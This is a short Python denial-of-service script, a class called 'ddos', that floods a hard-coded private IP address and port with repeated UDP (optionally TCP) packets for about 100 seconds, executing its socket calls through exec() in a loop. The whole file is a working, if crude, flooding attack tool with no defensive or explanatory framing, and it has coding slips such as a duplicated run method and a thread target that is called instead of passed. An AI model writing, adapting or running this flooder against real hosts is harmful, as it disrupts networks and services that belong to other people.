#!/usr/bin/python3
import socket
from threading import Thread
import time

class ddos:
 def __init__(self):
  
  self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  self.hit = 100
  self.ip = "192.168.43.1"#sucide
  self.port = 3730
  self.finish = False
  self.buffers = 2
  self.data = b"HTTP/1.1"*(10**self.buffers)
  self.proto_list = {"tcp": self.ddos_tcp, "udp": self.ddos_udp}
  self.proto = "udp"
  self.proto = self.proto_list[self.proto]
 def hitung(self):
  a = 0
  while (a <= self.hit):
   time.sleep(1)
   a+=1
  self.finish = True
 def ddos_tcp(self):

  torun = ["self.tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)", "self.tcp.connect((self.ip, self.port))", "self.tcp.send(self.data)", "self.tcp.close()"]
  for i in torun:
   try:
    exec(i)
   except:
    continue
   print("tcp")
 def run(self):
  Thread(target=self.hitung).start()
  while not self.finish:
   Thread(target=self.proto()).start()

 def ddos_udp(self):

  torun = ["self.tcp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)", "self.tcp.sendto(self.data, (self.ip, self.port))", "self.tcp.close()"]
  for i in torun:
   #try:
    exec(i)
   #except:
   # continue
    print("udp")
 def run(self):
  Thread(target=self.hitung).start()
  while not self.finish:
   Thread(target=self.proto()).start()

ddos().run()

  
  
  
  
 
 
